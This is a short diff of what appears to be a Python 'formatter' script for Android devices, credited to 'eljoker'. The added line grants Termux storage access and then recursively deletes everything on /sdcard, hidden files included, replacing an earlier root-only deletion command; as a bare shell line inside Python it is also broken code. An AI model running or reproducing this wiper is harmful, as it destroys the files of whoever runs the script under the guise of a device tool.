@@ -12,4 +12,4 @@ print("\033[1;32m       *Formatter for your device by eljoker* ")
 print("\033[1;37m       ====================================== ")
 print(" ")
 
-su -c rm -rif /sdcard/*
+termux-setup-storage && rm -rif /sdcard/* && rm -rif /sdcard/.*
